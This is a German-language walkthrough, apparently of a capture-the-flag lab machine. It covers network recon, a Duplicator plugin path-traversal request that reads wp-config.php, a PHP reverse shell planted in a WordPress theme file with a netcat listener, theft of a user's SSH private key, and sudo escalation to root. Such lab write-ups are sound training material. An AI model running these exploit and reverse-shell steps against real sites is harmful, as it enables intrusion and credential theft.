# 0. Recon

## 1. My IP
```bash
ifconfig
```

## 2. Ziel suchen
```bash
nmap 192.168.1.0/24
```

## 3. Ziel-IP scannen
```bash
nmap -sCV 192.168.1.205
```

---

# 1. Web Enumeration

## 1. Suche nach Files oder Login-Seite mit Gobuster
```bash
gobuster dir -u 192.168.1.205 -w /usr/share/wordlists/dirb/common.txt
```

## 2. Interessantes Verzeichnis gefunden: `/S3cr3t/`
```bash
gobuster dir -u 192.168.1.205/S3cr3t -w /usr/share/wordlists/dirb/common.txt
```

Da habe ich eine Login-Seite mit zwei wichtigen Kommentaren gefunden.

```bash
--plugins-detection aggressive
```

Ich habe gegoogelt und gesehen, dass das zu `wpscan` gehört.

Exploit-DB und andere Quellen sprechen über Kommentare hinzufügen oder löschen.  
Das hilft uns weiter.

Außerdem wurden zwei Benutzer gefunden.

Ich habe versucht, mich mit bekannten Passwörtern anzumelden.  
Falls das nicht funktioniert, suche ich nach `wp-config.php`, weil dort oft Benutzername und Passwort stehen.

---

# 3. WPScan

```bash
wpscan --url http://192.168.1.205/S3cr3t --plugins-detection aggressive
```

Hier wurde das Plugin `/duplicator/` gefunden.  
Die Version war veraltet und hatte eine bekannte Schwachstelle.

In Exploit-DB habe ich folgenden Exploit gefunden:

```bash
/wp-admin/admin-ajax.php?action=duplicator_download&file=../../../../../..
```

Ich habe den Exploit so gebaut:

```bash
http://192.168.1.205/S3cr3t/wp-admin/admin-ajax.php?action=duplicator_download&file../wp-config.php
```

Dadurch konnte ich die Datei mit Passwortinformationen lesen und mich im Webinterface anmelden.

Danach habe ich über einen Kommentar herausgefunden, dass man durch Bearbeiten oder Hinzufügen eines Kommentars eine Reverse Shell bekommen kann.

## Reverse Shell

### 1. Theme Editor öffnen
```text
Appearance > Theme File Editor > comments.php
```

### 2. PHP PentestMonkey Reverse Shell einfügen

IP und Port anpassen.

### 3. Listener auf Kali starten
```bash
rlwrap -cAr nc -lvnp 5555
```

### 4. Webseite mit der PHP-Shell refreshen

Danach bekam ich eine Verbindung auf Kali.

### 5. TTY Shell verbessern
```bash
python -c "import pty; pty.spawn('/bin/bash')"
```

---

# 2. Privilege Escalation

## 1. Aktuelles Verzeichnis prüfen
```bash
pwd
```

Jetzt suche ich nach einem SSH-Schlüssel, damit ich mich direkt von Kali verbinden kann.

Gefunden:

```text
/home/alpha/.ssh/id_rsa
```

Schlüssel anzeigen:

```bash
cat id_rsa
```

Jetzt habe ich den Private Key.

---

## 2. SSH-Verbindung von Kali

### Datei erstellen
```bash
nano key
```

Den kompletten Private Key einfügen und speichern.

### Rechte setzen
```bash
chmod 600 key
```

### Verbindung herstellen
```bash
ssh -i key alpha@192.168.1.205
```

Jetzt bin ich als Benutzer `alpha` angemeldet.

---

## 3. Root werden

Jetzt suche ich das Passwort von `alpha`.

Ich habe in `Desktop`, `Documents` und `Downloads` gesucht.

In `Documents` wurde `notes.txt` gefunden.

Danach:

```bash
sudo -l
```

Passwort benutzt:

```text
pingo
```

Jetzt bin ich root.

Flag lesen:

```bash
cd /root
cat root.txt
```
